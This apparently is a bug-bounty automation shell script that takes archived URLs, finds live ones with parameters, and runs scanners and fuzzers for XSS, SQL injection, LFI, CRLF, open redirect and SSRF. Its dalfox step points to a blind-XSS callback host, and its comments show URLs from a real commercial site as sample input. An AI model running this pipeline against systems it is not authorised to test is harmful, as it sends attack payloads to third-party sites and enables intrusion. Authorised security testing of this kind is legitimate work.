#!/bin/bash



red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
reset=`tput sgr0`

SECONDS=0

usage() { echo -e "Usage: $0 -f input waybackurl file  [-e]\n -o output directory \n " 1>&2; exit 1; }

while getopts ":f:o:" a; do
    case "${a}" in
        f)
            file=${OPTARG}
            ;;

            #### working on subdomain exclusion
        o)
            output_directory=${OPTARG}
            ;;

        *)
            usage
            ;;
    esac
done
shift $((OPTIND - 1))

file=$(realpath $file)
output_directory=$(realpath $output_directory)

run_gf(){
    mkdir -p $output_directory/output
    mkdir -p $output_directory/gfonly

    cp  $output_directory/final_full_live_urls.txt  $output_directory/gfonly/final_full_live_urls.txt

 touch $output_directory/output/gf_results.txt 



cd $output_directory/gfonly/

 printf "Potential \n\n " >> $output_directory/output/gf_results.txt 
gf potential $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 

  printf "xss \n\n " >> $output_directory/output/gf_results.txt 
gf xss $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 

  printf "redirect \n\n " >> $output_directory/output/gf_results.txt 
gf redirect $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 

  printf "wordpress \n\n " >> $output_directory/output/gf_results.txt 
gf wordpress $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 

   printf "debug_logic \n\n " >> $output_directory/output/gf_results.txt 
gf debug_logic $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 
 
   printf "idor \n\n " >> $output_directory/output/gf_results.txt 
gf idor $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 

   printf "lfi \n\n " >> $output_directory/output/gf_results.txt 
gf lfi $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 

   printf "rce \n\n " >> $output_directory/output/gf_results.txt 
gf rce $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 
   printf "sqli \n\n " >> $output_directory/output/gf_results.txt 
gf sqli $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 

   printf "ssrf \n\n " >> $output_directory/output/gf_results.txt 
gf ssrf $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 
   printf "ssti \n\n " >> $output_directory/output/gf_results.txt 
gf ssti $output_directory/gfonly/final_full_live_urls.txt| awk -F ':' '{$1=$2="\b"; print $0}' >> $output_directory/output/gf_results.txt 
 printf "\n\n\n" >> $output_directory/output/gf_results.txt 


 cd -
}

get_hidden_params(){
  mkdir -p $output_directory/ffuf_hidden_params
  ffuf -w $output_directory/final_full_live_urls.txt  -u FUZZ -t 100 -od $output_directory/ffuf_hidden_params/ -r
  cd $output_directory/
  extract_hidden_param.py -i "ffuf_hidden_params/*" -u $output_directory/final_full_live_urls.txt  -p $output_directory/output/hidden_params.txt
  cat $output_directory/output/hidden_params.txt >> $output_directory/output/params.txt
}

build_urls(){
mkdir -p $output_directory/build_urls

path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/ssrf.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/ssrf.txt

path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/LFI.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/LFI.txt


# path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/Open_redirect.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/Open_redirect.txt

path_plus_param.py -f  $output_directory/output/params.txt ~/Wordlist/parameter/columns.txt -p $output_directory/temp_processing/unique_domainpaths.txt > $output_directory/build_urls/xss.txt


# # for sqli, needing to append ' at the end of query value, so it is different from other test input
#qsreplace -a %23 > $output_directory/build_urls/sqli.txt
}

mkdir -p $output_directory/
mkdir -p $output_directory/output


cat $file | sed -E -e '/(\.jpg|\.png|\.gif|\.woff|\.css|\.ico|\.js|\.swf|\.zip|\.JPG|\.mp3|\.mov|\.svg|\.jpeg|\.map|\.pdf|\.txt)/d'| sed '/^[[:space:]]*$/d' > $output_directory/filtered_url.txt
### Remove urls with boring extensions

cat $output_directory/filtered_url.txt | wordlistgen > $output_directory/output/wordlist.txt




cat $output_directory/filtered_url.txt | urinteresting >  $output_directory/maybeinteresting_urls.txt
## find urls which may contain interesting things such as admin,proxy
cat $output_directory/filtered_url.txt | unfurl keys | awk '!seen[$0]++'   > $output_directory/output/params.txt
### Extract parameters of query string 

awk '/?/ && /=/' $output_directory/filtered_url.txt > $output_directory/with_querystring_urls.txt
### Only keeps urls with query string 


halive $output_directory/with_querystring_urls.txt -t 100 --output $output_directory/halive.txt
egrep '301|200' $output_directory/halive.txt | awk 'BEGIN { FS = "," } ; { print $1 }' > $output_directory/live_urls.txt
## Obtain currentlly live urls



mkdir -p $output_directory/temp_processing/


cat $output_directory/live_urls.txt | unfurl -u format " %p?%q"   >  $output_directory/temp_processing/pathandquery.txt

deduplicate_urls.py $output_directory/temp_processing/pathandquery.txt   $output_directory/live_urls.txt $output_directory/final_full_live_urls.txt

# Deduplicate live urls, only remain unique path and query sting   final_full_live_urls.txt
# https://www.takeaway.com/be-en/melita-beveren?gclid=CPnRucma5d8CFXyIxQIdLpgFgQ&gclsrc=ds
# https://www.takeaway.com/pizzahutgent?utm_campaign=foodorder&utm_medium=organic&utm_sour
# ce=google
# https://www.takeaway.com/_Incapsula_Resource?SWKMTFSR=1&e=0.7240281121983518
# https://www.takeaway.com/be/sushi-beveren?k1111=k1111

get_hidden_params

whatweb -i $output_directory/final_full_live_urls.txt | tee $output_directory/ip.txt

run_gf
#bug with gf 

cat  $output_directory/final_full_live_urls.txt | unfurl -u format "%s://%d%p" > $output_directory/temp_processing/unique_domainpaths.txt
#https://www.takeaway.com/bg-nl/acties-en-kortingen-in-sofiya
``
build_urls


#xss
cat $output_directory/final_full_live_urls.txt | dalfox pipe -w 70  --ignore-return 302,403,404 --only-discovery   -b https://ragnarokv.xss.ht  --silence  -o $output_directory/output/xss_dalfox.txt
grep -E -i -C 10  "reflected|triggered"    $output_directory/output/xss_dalfox.txt > $output_directory/output/dalfox_good.txt
# cat $output_directory/build_urls/xss.txt | dalfox pipe -w 70  --ignore-return 302,403,404 -b https://ragnarokv.xss.ht  --silence  -o $output_directory/output/xss2.txt
cat $output_directory/final_full_live_urls.txt | kxss >  $output_directory/output/xss1.txt
timeout 3h cat $output_directory/build_urls/xss.txt | kxss >  $output_directory/output/xss2.txt
#  xss.py -v 4 -u $output_directory/build_urls/xss.txt   -t 50 -O $output_directory/output/xss2.txt
#  touch $output_directory/output/xss_vulnerable.txt
#  grep vulnerable $output_directory/output/xss2.txt >> $output_directory/output/xss_vulnerable.txt




#lfi
 lfi.py -v 4 -u $output_directory/final_full_live_urls.txt  -t 50 -n $output_directory/output/lfi1.txt
 touch $output_directory/output/lfi_vulnerable.txt
 grep vulnerable $output_directory/output/lfi1.txt > $output_directory/output/lfi_vulnerable.txt
timeout 3h  lfi.py -v 4 -u $output_directory/final_full_live_urls.txt   -t 50  -n  $output_directory/output/lfi2.txt
 grep vulnerable $output_directory/output/lfi2.txt >> $output_directory/output/lfi_vulnerable.txt



#open_redirect
cat $output_directory/final_full_live_urls.txt | grep --color -iE "(callback=|checkout=|checkout_url=|continue=|data=|dest=|destination=|dir=|domain=|feed=|file=|file_name=|file_url=|folder=|folder_url=|forward=|from_url=|go=|goto=|host=|html=|image_url=|img_url=|load_file=|load_url=|login_url=|logout=|navigation=|next=|next_page=|Open=|out=|page=|page_url=|path=|port=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|reference=|return=|return_path=|return_to=|returnTo=|return_url=|rt=|rurl=|show=|site=|target=|to=|uri=|url=|val=|validate=|view=|RedirectUrl=|Return=|ReturnUrl=|ClientSideUrl=|failureUrl=|ru=|relayState=|fallbackurl=|clickurl=|dest_url=|urlReturn=|referer=|appUrlScheme=|cgi-bin/redirect.cgi=|window=)" > $output_directory/build_urls/Open_redirect_input.txt
cat $output_directory/build_urls/Open_redirect_input.txt | qsfuzz -c ~/Wordlist/qsfuzz/open_redirect.yaml -w 100 | tee $output_directory/output/openredirect1.txt

# openredirex.py -l $output_directory/build_urls/Open_redirect_input.txt -p /root/Wordlist/payload/openredirect_better.txt --keyword FUZZ | tee $output_directory/output/openredirect1.txt
# openredirex.py -l $output_directory/build_urls/Open_redirect.txt -p /root/Wordlist/payload/openredirect_better.txt --keyword FUZZ | tee $output_directory/output/openredirect2.txt



#sqlid

cat $output_directory/final_full_live_urls.txt | qsfuzz -c ~/Wordlist/qsfuzz/sqli.yaml -w 100 | tee $output_directory/output/sqli1.txt

#crlf 

cat $output_directory/final_full_live_urls.txt | qsfuzz -c ~/Wordlist/qsfuzz/crlf.yaml -w 100 | tee $output_directory/output/crlf.txt

#ssrf 

ssrf_replaceparam.py -f $output_directory/final_full_live_urls.txt > $output_directory/build_urls/ssrf_ffuf1.txt
ssrf_replaceparam.py -f $output_directory/build_urls/ssrf.txt > $output_directory/build_urls/ssrf_ffuf2.txt

ffuf -w $output_directory/build_urls/ssrf_ffuf1.txt -u FUZZ -t 100
timeout 3h ffuf -w $output_directory/build_urls/ssrf_ffuf2.txt -u FUZZ -t 100
psql -d ssrf  -c "SELECT * FROM ssrf_records where  created_on > current_date - interval '7 days'" --csv > $output_directory/output/ssrf.csv

